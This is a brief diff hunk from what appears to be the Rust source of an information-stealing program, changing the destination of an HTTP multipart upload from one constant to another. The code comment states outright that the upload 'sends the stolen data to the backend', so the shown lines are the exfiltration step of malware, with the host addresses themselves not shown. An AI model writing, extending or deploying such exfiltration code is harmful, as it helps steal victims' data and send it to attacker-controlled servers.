@@ -235,7 +235,7 @@ fn main() {
 
     // Sends the stolen data to the backend
     client
-        .post(constants::BACKEND)
+        .post(constants::WEBHOST)
         .multipart(form)
         .send()
         .unwrap();
